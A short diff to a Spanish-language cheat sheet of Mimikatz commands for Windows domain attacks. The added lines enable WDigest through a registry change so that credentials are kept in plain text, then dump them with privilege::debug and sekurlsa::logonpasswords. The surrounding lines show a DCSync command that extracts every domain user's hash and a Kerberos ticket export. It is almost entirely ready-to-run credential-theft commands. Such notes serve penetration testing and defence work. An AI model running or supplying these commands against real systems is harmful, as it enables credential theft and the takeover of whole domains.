@@ -29,6 +29,14 @@
 `lsadump::dcsync /all /csv`
 - Extrae hashes de todos los usuarios del dominio y los exporta en formato CSV.
 
+
+## Intentar habilitar WDigest para almacenar credenciales en texto plano
+- `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`
+    - privilege::debug
+    - sekurlsa::logonpasswords
+
+
+
 ## Kerberos
 
 `kerberos::list /export`
